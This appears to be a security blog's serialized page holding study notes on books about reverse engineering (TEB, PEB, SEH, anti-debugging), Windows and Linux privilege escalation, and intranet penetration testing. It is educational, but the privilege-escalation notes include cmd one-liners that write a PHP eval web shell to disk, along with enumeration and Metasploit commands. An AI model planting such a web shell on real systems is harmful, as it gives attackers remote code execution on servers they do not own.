PEView: IMAGE_DATA_DIRECTORY Write the assembly code: OllyDbg: Copy to executable -> Selection -> Save file. OllyDbg: Save file. Testing Chapter 46 - TEBTEB stands for Thread Environment Block. We can view TEB structure using the following command in WinDbg:1&gt; dt _TEB Members of TEB There are two important members: +0x030 ProcessEnvironmentBlock: Ptr32 _PEB\\This pointer points to PEB (Introduces in next chapter) . NtTib\\TIB stands for Thread Information Block, this is the definition of TIB:12345678910111213typedef struct _NT_TIB&#123; struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; PVOID StackBase; PVOID StackLimit; PVOID SubSystemTib; union &#123; PVOID FiberData; DWORD Version; &#125; DUMMYUNIONNAME; PVOID ArbitraryUserPointer; struct _NT_TIB *Self;&#125; NT_TIB, *PNT_TIB; 46.2 - Accessing TEBNtdll.NtCurrentTeb()FS Segment RegisterFS segment register indicates the TEB structure of the current thread. FS:[0x18] = start address of TEB \\begin{align*} FS:[0x18] &= TEB.NtTib.Self\\\\ &= Address of TIB\\\\ &= Address of TEB FS:0 \\\\ &= 7FFDF000 \\end{align*} FS:[0X30] = start address of PEB \\begin{align*} FS:[0x30] &= TEB.ProcessEnvironmentBlock\\\\ &= Address of PEB \\end{align*} FS:[0] = start address of SEH \\begin{align*} FS:[0] &= TEB.NtTib.ExceptionList\\\\ &= Address of SEH \\end{align*} Chapter 47 - PEB47.1 - PEBAccessing PEBPEB stands for Process Environment Block.PEB structure stores information of process. We execute the following instruction in OllyDby (F7 or F8) at EP:1MOV EAX,DWORD PTR FS:[0x30] EAX Definition of PEB123456789101112131415161718192021typedef struct _PEB &#123; BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId;&#125; PEB, *PPEB; Members of PEBWindows 10 EAX 47.2 - Important Members12345+002 BeginDebugged : UChar+008 ImageBaseAddress : Ptr32 Void+00c Ldr : Ptr32 _PEB_LDR_DATA+018 ProcessHeap : Ptr32 Void+068 NtGlobalFlag : Uint4B PEB.BeginDebugged:\\This value is commonly used in anti-debugging. PEB.ImageBaseAddress:\\This value indicates the ImageBase of the process. We use GetModuleHandle() to obtain ImageBase. PEB.Ldr:\\This member is a pointer that points to _PEB_LDR_DATA structure. After a DLL has been loaded into a process, we can obtain the ImageBase of the module through PEB.Ldr. PEB.ProcessHeap &amp; PEB.NtGlobalFlag:\\These two values are commonly used in anti-debugging. Chapter 48 - SEH48.1 - SEHSEH stands for Structured Exception Handling. SEH is the exception handling mechanism used in Windows. In practice, we use keywords such as __try, __except, __finally to implement exception handling. Additionally, this mechanism is widely used in anti-debugging techniques. Notice that the structure of SEH is different from the try / catch mechanism in C++. Windows introduced the SEH mechanism first, and it was later integrated into Visual C++. In other words, SEH is a low-level exception handling mechanism supported by the Windows operating system and the Visual C++ compiler. Exception. Memory: Address 0 is undefined. 48.4 - ExceptionThere are 5 types of common exceptions: EXCEPTION_ACCESS_VIOLATION(C0000005) EXCEPTION_BREAKPOINT(80000003) EXCEPTION_ILLEGAL_INSTRUCTION(C000001D) EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094) EXCEPTION_SINGLE_STEP(80000004) 48.5 - Details of SEHSEH Chain1234567typedef struct _EXCEPTION_REGISTRATION_RECORD&#123; PEXCEPTION_REGISTRATION_RECORD Next; PEXCEPTION_DISPOSITION Handler;&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;//Source: https://maple19out.tistory.com/72 Source: https://maple19out.tistory.com/72 Definition of Exception HandlerTEB.NtTib.ExceptionListUsing SEH48.6 - Practice#2 - seh.exeChapter 49 - IA-32 Instruction49.2 - Terminology Terminology Description Machine Language Instruction OpCode Assembly Assemble Assembler Disassemble Disassembler Disassembly *Compile *Link 49.3 - IA-32 Instruction Format Source: https://www.researchgate.net/figure/A-32-general-instruction-format_fig1_265265229 Instruction PrefixOpcodeModR/MSIBSIB (Scale-Index-Base) is also an optional field. DeplacementImmediate49.4 - Instruction Analyzing49.5 - PracticeChapter 50 - Anti-Debugging50.1 Anti-DebuggingAnti-Debugging techniques are strongly dependent to OS and debugger. 50.2 - Anti-Anti-Debugging50.3 - Types of Anti-DebuggingStatic Anti-DebuggingStatic anti-debugging is used to detect a debugger. If a debugger is detected, the process cannot execute normally. Once the static anti-debugging technique is cracked, the program can execute normally. Dynamic Anti-DebuggingEven though we have cracked the static anti-debugging technique, we may still encounter difficulties. If a dynamic anti-debugging technique is applied, it becomes difficult to trace instructions because this technique interferes with the debugger. Chapter 51 - Static Anti-Debugging Techniques51.2 - PEBPEB is used for detecting a debugger. It provides reliable and convenient information. This technique is commonly used in anti-debugging. BeingDebugged (+0x2)Ldr (+0xC)Process Heap (+0x18) GetPocessHeap() Flags (+0xC) &amp; Force Flags (+0x10) NtGlobalFlag (+0x68)51.3 - NtQueryInformationProcess()123456789__kernel_entry NTSTATUS NtQueryInformationProcess( [in] HANDLE ProcessHandle, [in] PROCESSINFOCLASS ProcessInformationClass, [out] PVOID ProcessInformation, [in] ULONG ProcessInformationLength, [out, optional] PULONG ReturnLength);//Source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124typedef enum _PROCESSINFOCLASS&#123; ProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX ProcessIoCounters, // q: IO_COUNTERS ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2 ProcessTimes, // q: KERNEL_USER_TIMES ProcessBasePriority, // s: KPRIORITY ProcessRaisePriority, // s: ULONG ProcessDebugPort, // q: HANDLE ProcessExceptionPort, // s: PROCESS_EXCEPTION_PORT (requires SeTcbPrivilege) ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN ProcessLdtInformation, // qs: PROCESS_LDT_INFORMATION // 10 ProcessLdtSize, // s: PROCESS_LDT_SIZE ProcessDefaultHardErrorMode, // qs: ULONG ProcessIoPortHandlers, // s: PROCESS_IO_PORT_HANDLER_INFORMATION // (kernel-mode only) ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void ProcessUserModeIOPL, // qs: ULONG (requires SeTcbPrivilege) ProcessEnableAlignmentFaultFixup, // s: BOOLEAN ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS ProcessWx86Information, // qs: ULONG (requires SeTcbPrivilege) (VdmAllowed) ProcessHandleCount, // q: ULONG, PROCESS_HANDLE_INFORMATION // 20 ProcessAffinityMask, // qs: KAFFINITY, qs: GROUP_AFFINITY ProcessPriorityBoost, // qs: ULONG ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND ProcessWow64Information, // q: ULONG_PTR ProcessImageFileName, // q: UNICODE_STRING ProcessLUIDDeviceMapsEnabled, // q: ULONG ProcessBreakOnTermination, // qs: ULONG ProcessDebugObjectHandle, // q: HANDLE // 30 ProcessDebugFlags, // qs: ULONG ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: PROCESS_HANDLE_TRACING_ENABLE[_EX] or void to disable ProcessIoPriority, // qs: IO_PRIORITY_HINT ProcessExecuteFlags, // qs: ULONG (MEM_EXECUTE_OPTION_*) ProcessTlsInformation, // qs: PROCESS_TLS_INFORMATION // ProcessResourceManagement ProcessCookie, // q: ULONG ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA ProcessPagePriority, // qs: PAGE_PRIORITY_INFORMATION ProcessInstrumentationCallback, // s: PVOID or PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40 ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]; s: void ProcessImageFileNameWin32, // q: UNICODE_STRING ProcessImageFileMapping, // q: HANDLE (input) ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE ProcessGroupInformation, // q: USHORT[] ProcessTokenVirtualizationEnabled, // s: ULONG ProcessConsoleHostProcess, // qs: ULONG_PTR // ProcessOwnerInformation ProcessWindowInformation, // q: PROCESS_WINDOW_INFORMATION // 50 ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8 ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION ProcessDynamicFunctionTableInformation, // s: PROCESS_DYNAMIC_FUNCTION_TABLE_INFORMATION ProcessHandleCheckingMode, // qs: ULONG; s: 0 disables, otherwise enables ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION ProcessWorkingSetControl, // s: PROCESS_WORKING_SET_CONTROL ProcessHandleTable, // q: ULONG[] // since WINBLUE ProcessCheckStackExtentsMode, // qs: ULONG // KPROCESS-&gt;CheckStackExtents (CFG) ProcessCommandLineInformation, // q: UNICODE_STRING // 60 ProcessProtectionInformation, // q: PS_PROTECTION ProcessMemoryExhaustion, // s: PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD ProcessFaultInformation, // s: PROCESS_FAULT_INFORMATION ProcessTelemetryIdInformation, // q: PROCESS_TELEMETRY_ID_INFORMATION ProcessCommitReleaseInformation, // qs: PROCESS_COMMIT_RELEASE_INFORMATION ProcessDefaultCpuSetsInformation, // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved1Information ProcessAllowedCpuSetsInformation, // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved2Information ProcessSubsystemProcess, // s: void // EPROCESS-&gt;SubsystemProcess ProcessJobMemoryInformation, // q: PROCESS_JOB_MEMORY_INFO ProcessInPrivate, // q: BOOLEAN; s: void // ETW // since THRESHOLD2 // 70 ProcessRaiseUMExceptionOnInvalidHandleClose, // qs: ULONG; s: 0 disables, otherwise enables ProcessIumChallengeResponse, // q: PROCESS_IUM_CHALLENGE_RESPONSE ProcessChildProcessInformation, // q: PROCESS_CHILD_PROCESS_INFORMATION ProcessHighGraphicsPriorityInformation, // q: BOOLEAN; s: BOOLEAN (requires SeTcbPrivilege) ProcessSubsystemInformation, // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2 ProcessEnergyValues, // q: PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES_V1 ProcessPowerThrottlingState, // qs: POWER_THROTTLING_PROCESS_STATE ProcessActivityThrottlePolicy, // qs: PROCESS_ACTIVITY_THROTTLE_POLICY // ProcessReserved3Information ProcessWin32kSyscallFilterInformation, // q: WIN32K_SYSCALL_FILTER ProcessDisableSystemAllowedCpuSets, // s: BOOLEAN // 80 ProcessWakeInformation, // q: PROCESS_WAKE_INFORMATION // (kernel-mode only) ProcessEnergyTrackingState, // qs: PROCESS_ENERGY_TRACKING_STATE ProcessManageWritesToExecutableMemory, // s: MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3 ProcessCaptureTrustletLiveDump, // q: ULONG ProcessTelemetryCoverage, // q: TELEMETRY_COVERAGE_HEADER; s: TELEMETRY_COVERAGE_POINT ProcessEnclaveInformation, ProcessEnableReadWriteVmLogging, // qs: PROCESS_READWRITEVM_LOGGING_INFORMATION ProcessUptimeInformation, // q: PROCESS_UPTIME_INFORMATION ProcessImageSection, // q: HANDLE ProcessDebugAuthInformation, // s: CiTool.exe --device-id // PplDebugAuthorization // since RS4 // 90 ProcessSystemResourceManagement, // s: PROCESS_SYSTEM_RESOURCE_MANAGEMENT ProcessSequenceNumber, // q: ULONGLONG ProcessLoaderDetour, // qs: Obsolete // since RS5 ProcessSecurityDomainInformation, // q: PROCESS_SECURITY_DOMAIN_INFORMATION ProcessCombineSecurityDomainsInformation, // s: PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION ProcessEnableLogging, // qs: PROCESS_LOGGING_INFORMATION ProcessLeapSecondInformation, // qs: PROCESS_LEAP_SECOND_INFORMATION ProcessFiberShadowStackAllocation, // s: PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1 ProcessFreeFiberShadowStackAllocation, // s: PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION ProcessAltSystemCallInformation, // s: PROCESS_SYSCALL_PROVIDER_INFORMATION // since 20H1 // 100 ProcessDynamicEHContinuationTargets, // s: PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION ProcessDynamicEnforcedCetCompatibleRanges, // s: PROCESS_DYNAMIC_ENFORCED_ADDRESS_RANGE_INFORMATION // since 20H2 ProcessCreateStateChange, // s: Obsolete // since WIN11 ProcessApplyStateChange, // s: Obsolete ProcessEnableOptionalXStateFeatures, // s: ULONG64 // EnableProcessOptionalXStateFeatures ProcessAltPrefetchParam, // qs: OVERRIDE_PREFETCH_PARAMETER // App Launch Prefetch (ALPF) // since 22H1 ProcessAssignCpuPartitions, // s: HANDLE ProcessPriorityClassEx, // s: PROCESS_PRIORITY_CLASS_EX ProcessMembershipInformation, // q: PROCESS_MEMBERSHIP_INFORMATION ProcessEffectiveIoPriority, // q: IO_PRIORITY_HINT // 110 ProcessEffectivePagePriority, // q: ULONG ProcessSchedulerSharedData, // q: SCHEDULER_SHARED_DATA_SLOT_INFORMATION // since 24H2 ProcessSlistRollbackInformation, ProcessNetworkIoCounters, // q: PROCESS_NETWORK_COUNTERS ProcessFindFirstThreadByTebValue, // q: PROCESS_TEB_VALUE_INFORMATION // NtCurrentProcess ProcessEnclaveAddressSpaceRestriction, // qs: // since 25H2 ProcessAvailableCpus, // q: PROCESS_AVAILABLE_CPUS_INFORMATION MaxProcessInfoClass&#125; PROCESSINFOCLASS;//Source: https://ntdoc.m417z.com/processinfoclass ProcessDebugPort(0x7)1234567DWORD dwDebugPort = 0;pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;dwDebugPort, sizeof(dwDebugPort), NULL);printf(&quot;NtQueryInformationProcess(PorcessDebugPort) = 0x%X\\n&quot;, dwDebugPort);if (dwDebugPort != 0x0) printf(&quot;\\t=&gt; Debugging.\\n&quot;);else printf(&quot;\\t=&gt; Not debugging.\\n&quot;); CheckRemoteDebuggerPresent() ProcessDebugObjectHandle(0x1E)ProcessDebugFlags(0x1F)51.4 - NtQuerySystemInformation()51.5 - NtQueryObject()51.6 - ZwSetInformationThread()51.7 - TLS Callback Function51.8 - ETCChapter 52 - Dynamic Anti-Debugging Techniques52.2 - ExceptionSEHSetUnhandledExceptionFilter()52.3 - Time CheckingInterval COunter based method Time based method RDTSC52.4 - Trap Flag52.5 - 0xCCChapter 53 - Advanced Anti-Debugging53.1 - Advanced Anti-Debugging53.2 - Garbage Code53.3 - Breaking Code Alignment53.4 - Encryption/Decription53.5 - Stolen Bytes (Remove OEP) 53.6 - API Relocation53.7 - Debug Blocker (Self Debugging)Chapter 54 - Practice#1: ServiceChapter 55 - Practice#2: Self CreationChapter 56 - Practice#3: PE Image SwitchingChapter 57 - Practice#4: Debug BlockerTHANKS FOR READING","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Study","slug":"Study","permalink":"https://iss4cf0ng.github.io/tags/Study/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"OllyDbg","slug":"OllyDbg","permalink":"https://iss4cf0ng.github.io/tags/OllyDbg/"},{"name":"Assembly","slug":"Assembly","permalink":"https://iss4cf0ng.github.io/tags/Assembly/"},{"name":"PE","slug":"PE","permalink":"https://iss4cf0ng.github.io/tags/PE/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://iss4cf0ng.github.io/tags/CrackMe/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Privilege Escalation - Offensive and Defensive Tactics and Techniques","slug":"2026-1-2-NotePrivilegeEscalationTechnique","date":"2026-01-02T15:36:14.000Z","updated":"2026-01-11T07:38:53.389Z","comments":true,"path":"2026/01/02/2026-1-2-NotePrivilegeEscalationTechnique/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NotePrivilegeEscalationTechnique/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Privilege Escalation - Offensive and Defensive Tactics and Techniques”.The content will be continuously updated as I read through the book. ReflectionChapter.1 - Fundamentals1.2 - Windows Privilege EscalationLocal User And Local Groupcmd:12345678&gt; net userUser accounts for \\\\DESKTOP-NKNBEK2-------------------------------------------------------------------------------Administrator DefaultAccount Guestsdksdk WDAGUtilityAccountThe command completed successfully. PowerShell123456789PS &gt; Get-LocalUserName Enabled Description---- ------- -----------Administrator False Built-in account for administering the computer/domainDefaultAccount False A user account managed by the system.Guest False Built-in account for guest access to the computer/domainsdksdk TrueWDAGUtilityAccount False A user account managed and used by the system for Windows Defender Application Guard scen... lusrmgr.msc 12&gt; net user &lt;Username&gt; &lt;Password&gt; /add&gt; net user &lt;Username&gt; /del Local Group12345678910111213141516171819202122232425&gt; net localgroupAliases for \\\\DESKTOP-NKNBEK2-------------------------------------------------------------------------------*Access Control Assistance Operators*Administrators*Backup Operators*Cryptographic Operators*Device Owners*Distributed COM Users*Event Log Readers*Guests*Hyper-V Administrators*IIS_IUSRS*Network Configuration Operators*Performance Log Users*Performance Monitor Users*Power Users*Remote Desktop Users*Remote Management Users*Replicator*System Managed Accounts Group*UsersThe command completed successfully.1234567891011121314151617181920212223&gt; Get-LocalGroupName Description---- -----------Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...Administrators Administrators have complete and unrestricted access to the computer/domainBackup Operators Backup Operators can override security restrictions for the sole purpose of back...Cryptographic Operators Members are authorized to perform cryptographic operations.Device Owners Members of this group can change system-wide settings.Distributed COM Users Members are allowed to launch, activate and use Distributed COM objects on this ...Event Log Readers Members of this group can read event logs from local machineGuests Guests have the same access as members of the Users group by default, except for...Hyper-V Administrators Members of this group have complete and unrestricted access to all features of H...IIS_IUSRS Built-in group used by Internet Information Services.Network Configuration Operators Members in this group can have some administrative privileges to manage configur...Performance Log Users Members of this group may schedule logging of performance counters, enable trace...Performance Monitor Users Members of this group can access performance counter data locally and remotelyPower Users Power Users are included for backwards compatibility and possess limited adminis...Remote Desktop Users Members in this group are granted the right to logon remotelyRemote Management Users Members of this group can access WMI resources over management protocols (such a...Replicator Supports file replication in a domainSystem Managed Accounts Group Members of this group are managed by the system.Users Users are prevented from making accidental or intentional system-wide changes an... Useful group during penetration testing: Administrators Power Users Users Guests TrustedInstaller Authenticated Users Built-in Account Local System:This account has the greatest power before Windows XP, it is able to modify file system, registry, task, Windows Installer, Windows Update, etc. However, Microsoft separated it, nowadays, the account with greatest pwoer is TrustedInstaller. Local Service Network Service Useful Command:| cmd | PowerShell | Description || —- | —- | —- || net user | Get-LocalUser | View local users. || net localgroup | Get-LocalGroup | View local groups. || net user | Get-LocalGroup -Name | Select-Object * | View user’s properties. || net localgroup | Get-LocalGroupMember | View users in the group. || net user /add | $password=Read-Host -AsSecureString New-LocalUser “username” -Password $password | Add new user. || net localgroup /add | Add-LocalGroupMember - Group ‘‘ -Member (‘‘) | Add user into the group. || net user /del | Remove-LocalUser -Name | Delete user. || net user | $password=Read-Host -AsSecureString Set-LocalUser -Name -Password $password | Change user’s password | ACL (Access Control List) Term Meaning Security Descriptor Describe the information of Security Object, like SID, DACL, SACL, etc. Security Object Object with Security Descriptor, like file, directory, registry, process, thread, pipe, etc. ACL Access Control List ACE Access Control Entries DACL Discretionary Access Control List SACL System Access Control List trustees Account, group, login session, etc. Security Descriptor View SID of current user:1&gt; whoami /user View SID of all users: 1&gt; wmic useraccount get name,sid S-R-X-Y1-Y2-Yn-1-Yn: S: Indicates that the string is a Security Identifier(SID). R: Indicates the revision level. X: Indicates the identifier authority value. Y: Represents a series of subauthority values, where n is the number of values. The first part of the series(-Y1-Y2-Yn-1) is the domain identifier. This element of the SID becomes significant in an enterprise with several domains. No two domains in an enterprise share the same domain identifier. The last item in the series of subauthority values(-Yn) is the RID. It distinguishes one account or group from all other accounts and groups in the domain. Now two accounts or groups in any domain share the same RID. Everyone: S-1-1-0 BUILTIN\\Administrators: S-1-5-32-544, built-in adminsitrator group. BUILTIN\\Users: S-1-5-32-545, built-in user group. NTAUTHORITY\\INTERACTIVE: S-1-5-4, group of users which login whith interactive. NTAUTHORITY\\AuthenticatedUsers: S-1-5-11, authenticated users. LocalService: S-1-5-19 NetworkService: S-1-5-20 LocalSystem: S-1-5-18 Authentication winlogon.exe lsass.exe SAM: Security Account Manager, /system32/config, HKEY_LOCAL_MACHINE TokenAn access token is an object that represents the security context of a process or thread. A session is created after the user is successfully authenticated and logs in. The Windows system then determines the user’s SID and the SIDs of the groups to which the user belongs. Subsequently, the Local Security Authority (LSA) creates an access token for the user. An access token contains the user’s SID, group SIDs, session ID, privileges, the default DACL, the token type, and other attributes. The access token is assigned to userinit.exe, whose path is stored in the registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. userinit.exe is responsible for initializing the user’s environment, such as executing logon scripts, establishing network connections, and launching startup applications. It then reads the value of Shell, which is explorer.exe by default, and launches it as the Windows graphical user interface. After that, all child processes and threads inherit the access token of their parent process—explorer.exe—unless a process explicitly specifies a different token. Initially, most processes share the same access token. Token has two types: Primary Token Impersonation Token Separation of Privilege1&gt; whoami /priv 1&gt; gpedit.msc 1PS&gt; Enable-Privilege -Privilege SeBackupPrivilege Command Function Enable-Privilege -Privilege &lt;Privilege’s name&gt; Enable privilege Disable-Privilege -Privilege &lt;Privilege’s name&gt; Disable privilege Add-Privilege -Privilege &lt;Privilege’s name&gt; Add privilege Remove-Privilege -Privilege &lt;Privilege’s name&gt; Remove privilege Get-Privilege -CurrentUser View privilege of current user Windows Hash LM Hash NTLM Hash UACUAC (User Account Control) Windows ServiceRegistryData type: REG_SZ REG_MULTI_SZ REG_BINARY REG_DWORD Hive Abbreviation Description HKEY_CLASSES_ROOT HKCR File associations and COM object registration. HKEY_CURRENT_USER HKCU Settings for the currently logged-in user. HKEY_LOCAL_MACHINE HKLM System-wide configuration for the entire machine. HKEY_USERS HKU All user registry hives currently loaded. HKEY_CURRENT_CONFIG HKCC Current hardware profile. 1.3 - Linux Privilege EscalationUser Root User(Super User) Regular User System User User GroupUser Configuration Files File Meaning /etc/passwd Users and their properties (such as, name, uid, group id). /etc/shadow Users’ password and properties. /etc/group Groups and their properties. /etc/gshadow Groups’ and their properties. Source: https://infosecwriteups.com/what-is-etc-passwd-group-shadow-file-in-linux-bd7b28f353f3 Source: https://linuxopsys.com/etc-shadow-file-explained Source: https://dpcvirtualtips.com/working-with-local-users-and-groups-on-rhel/ Source: https://ashutoshlinuxnotes.blogspot.com/p/user-and-group-permission.html Chapter.2 - Environment Setting-up and Tools2.2 - Kali LinuxMetasploit1&gt; sudo msfconsole 1&gt; sudo msfdb status 1&gt; sudo msfdb init 1msf&gt; db_status 1msf&gt; search privilege escalation platform:windows type:exploit Cobalt StrikeEmpire 42.3 - PowerShell2.4 - WinPEAs2.5 - PowerUp and SharpUp2.6 - Accesshk2.7 - cacls and icaclsChapter.3 - File Action3.1 - WindowsCreate/Write File cmd Write file with set: 1set /p=&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&lt;nul&gt;c:\\1.php Write file with echo: 1echo ^&lt;?php @eval($_POST[&#x27;hello&#x27;])?&gt;&gt;c:\\2.php Appending with echo:1echp ok&gt;&gt;c:\\2.php Appending without new line:1set /p=&quot;222&quot;&gt;&gt;c:\\1.php Overwrite:1echo ok&gt;c:\\2.php Write file with echo without space:12echo.^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\\3.phpecho,^&lt;?php @eval($_POST[&#x27;hello&#x27;])?^&gt;&gt;c:\\3.php Create empty file:1234cd.&gt;12.txtcopy nul 12.txttype nul&gt;12.txtfsutil file createnew c:\\12.txt 0 copy file12type 1.php &gt; ok.phpcopy 1.php ok.php move file1move c:\\1.txt d:\\ PowerShell Read FileDownload File PowerShell PHP Python VBS bitsadmin certutil Compress/Decompress File makecab/expand WinRAR 7-Zip BandiZip PowerShell 3.2 - LinuxChapter.4 - Windows Information Enumeration4.1 - Server Information EnumerationSystem Version1&gt; ver Architecture1&gt; wmic os get osarchitecture 1&gt; echo %PROCESSOR_ARCHITECTURE% Service Information1&gt; sc query state=all 1&gt; wmic service list brief 1PS&gt; Get-WmiObject win32_service | select Name,PathName Task1&gt; tasklist 1&gt; tasklist /svc 1&gt; wmic process list brief 1PS&gt; ps 1PS&gt; Get-WmiObject -Query &quot;select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | select Name, Handle, @&#123;Label=&quot;Owner&quot;;Expression=&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize Driver Information1&gt; driverquery Disk Information1wmic logicaldisk get caption,description,providername 1tree d:\\ &gt;C:\\tree.txt 1dir /s d:\\ &gt;C:\\file.txt Hotfix1&gt; 1PS&gt; 1PS&gt; 4.2 - Network Information Enumeration4.3 - User’s Information Enumeration4.4 - Anti-Virus Information EnumerationChapter.5 - Windows Password ActionChapter.6 - Unsafe Windows System ConfigurationChapter.7 - Windows System Exploitation and Privilege EscalationChapter.8 - Linux Information Enumeration","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Blackhat","slug":"Blackhat","permalink":"https://iss4cf0ng.github.io/tags/Blackhat/"},{"name":"Hacking","slug":"Hacking","permalink":"https://iss4cf0ng.github.io/tags/Hacking/"},{"name":"Hack","slug":"Hack","permalink":"https://iss4cf0ng.github.io/tags/Hack/"},{"name":"LAN","slug":"LAN","permalink":"https://iss4cf0ng.github.io/tags/LAN/"},{"name":"Domain","slug":"Domain","permalink":"https://iss4cf0ng.github.io/tags/Domain/"},{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"Pentest","slug":"Pentest","permalink":"https://iss4cf0ng.github.io/tags/Pentest/"},{"name":"PrivilegeEscalation","slug":"PrivilegeEscalation","permalink":"https://iss4cf0ng.github.io/tags/PrivilegeEscalation/"},{"name":"Privilege","slug":"Privilege","permalink":"https://iss4cf0ng.github.io/tags/Privilege/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Intranet Penetration Practice Strategy","slug":"2026-1-2-NoteLanPenetrationGuidelines","date":"2026-01-02T15:35:30.000Z","updated":"2026-01-15T09:18:59.435Z","comments":true,"path":"2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteLanPenetrationGuidelines/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Intranet Penetration Practice Strategy”.The content will be continuously updated as I read through the book. ReflectionThis book first introduces fundamental knowledge and tools of intranet penetration testing.It then demonstrates practical approaches to penetration testing using the provided experimental enviroment.The following topics are covered: Cobalt Strike Web penetration. Spreading payload(virus) in intranet. Confrontation of Anti-Virus. Post-Exploitation Persistence. PTH(Pass-the-Hash). While the book covers a wide range of post-exploitation techniques, it does not delve into the underlying principles behind these tools.As a result, readers without a solid foundational background may struggle to fully understand certain features, such as the autoroute mechanism in Meterpreter, and Socks5 proxy. Chapter.1 - Fundamental of Intranet Penetration WORKGROUP Domain AD (Active Directory) 1234&gt; systeminfo...Domain: WORKGROUP... 1234&gt; systeminfo...Domain: SomeDomain.org... Chapter.3 - Environment Setting-Up and Useful Tools3.2 - Port Discovery1&gt; nmap -sC -sV -v -A &lt;TargetIP&gt; -sC: Performs a script scan using the default set of safe scripts from the Nmap Script Engine (NSE). -sV: Enables version detection. -v: Verbose, show more information. -A: Enable OS detection, version detection, script scanning, and traceroute. 3.4 - Buster 